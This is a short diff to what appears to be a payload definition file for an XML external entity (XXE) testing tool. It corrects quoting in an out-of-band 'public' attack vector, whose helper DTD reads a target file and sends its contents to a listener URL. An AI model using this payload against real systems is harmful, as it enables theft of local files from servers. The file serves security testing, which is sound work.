@@ -19,10 +19,10 @@
 </attackvector>
 <attackvector type="public">
 <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data PUBLIC p "§tf_helperURL§">
+<!DOCTYPE data PUBLIC "p" "§tf_helperURL§">
 <data>&send;</data>]]></directMessage>
-<helperMessage><![CDATA[ <!ENTITY % file PUBLIC p2 "§tf_targetFILE§">
-<!ENTITY % all "<!ENTITY send PUBLIC p3 '§tf_listenURL§?%file;'>">
+<helperMessage><![CDATA[ <!ENTITY % file PUBLIC "p2" "§tf_targetFILE§">
+<!ENTITY % all "<!ENTITY send PUBLIC "p3" '§tf_listenURL§?%file;'>">
 %all;]]></helperMessage>
 </attackvector>
 </attackvectors>
